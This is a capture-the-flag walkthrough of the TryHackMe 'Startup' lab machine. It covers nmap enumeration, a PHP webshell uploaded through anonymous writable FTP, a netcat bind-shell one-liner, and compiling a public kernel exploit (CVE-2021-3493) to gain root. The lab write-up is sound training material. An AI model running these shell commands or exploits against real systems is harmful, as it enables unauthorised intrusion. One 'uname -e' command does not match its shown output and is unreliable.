# Overview
Machine : [Startup](https://tryhackme.com/room/startup/)

Platform : [Tryhackme](https://tryhackme.com/)

Difficulty : easy

Category : Linux & Web

# Enumeration
First we will nmap scan to discover open ports and services with simple nmap script and OS detection
```bash
sudo nmap -T4 -p- -Pn -A 10.128.149.186 -oN result.txt
```
**Nmap Report**
```
Nmap scan report for 10.128.149.186
Host is up (0.00073s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.128.83.160
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/8%OT=21%CT=1%CU=39529%PV=Y%DS=1%DC=T%G=Y%TM=69D63DC1
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M230
OS:1ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68D
OS:F)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT     ADDRESS
1   0.51 ms 10.128.149.186
```
we found that FTP server is opened with anonymous login. Discovering FTP server, **vsftpd 3.0.3** allowing login without user name and password .
```bash
ftp 10.128.149.186 21
```
listing files we found file under name `ftp` allowing write into it.
![Image](../../images/sta-2_clean.png)

---
Also there is HTTP server i will use gobuster to directory enumeration
```bash
gobuster dir -u "http://10.128.149.186/" -w /usr/share/wordlist/big.txt -t 300
```
we found web directory called `files` it contain `ftp` files . First thing we will focus on it to abuse this page to *file upload* vulnerability .
![Image](../../images/sta-2_clean.png)
# Initial Access
After we figure out this door we will use abuse it by uploading *webshell*
```bash
ftp> put shell.php
```
go to website directory and open it 
![Image](../../images/sta-3_clean.png)
now we have initial access to target server
# Installation
To have more efficient connection we add bind shell to *webshell* to have more efficiency in controlling. 
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9123 > /tmp/f
```

# Privilege Escalation
## Enumeration
first i will look for kernel exploitation
```bash
$uname -e
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
this kernel version have 1. [CVE-2021-3493](https://github.com/puckiestyle/CVE-2021-3493/tree/main) Exploit . we will upload it to ftp server then exploit it .
## Exploit
```bash
gcc exploit.c -o pwd
```
![Image](../../images/sta-4_clean.png)
# Flags
1. ![Image](../../images/sta-5_clean.png)
2. ![Image](../../images/sta-6_clean.png)
3. ![Image](../../images/sta-7_clean.png)
